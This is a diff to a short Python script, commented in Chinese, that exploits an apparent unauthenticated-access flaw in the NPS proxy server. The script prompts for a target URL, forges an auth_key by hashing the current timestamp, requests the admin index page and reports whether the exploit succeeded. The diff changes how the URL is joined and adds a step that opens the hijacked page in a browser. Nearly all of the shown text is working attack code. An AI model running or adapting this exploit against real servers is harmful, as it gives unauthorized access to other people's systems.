@@ -2,6 +2,7 @@ import hashlib
 import datetime
 import time
 import requests
+import webbrowser
 
 #  输入url地址
 url = input("请输入漏洞网址:")
@@ -22,7 +23,7 @@ hash_object.update(timestamp_str)
 encrypted_timestamp = hash_object.hexdigest()
 
 #  输出加密后并访问的url地址
-vuln = f"{url}/Index/Index?auth_key={encrypted_timestamp}&timestamp={timestamps}"
+vuln = f"{url}Index/Index?auth_key={encrypted_timestamp}&timestamp={timestamps}"
 
 #  请求这个漏洞地址
 response = requests.get(f"{vuln}")
@@ -33,5 +34,6 @@ response = requests.get(f"{vuln}")
 # 判断请求是否成功
 if response.status_code == 200:
     print("nps未授权漏洞利用成功")
+    webbrowser.open(vuln)
 else:
     print("nps未授权漏洞利用失败")
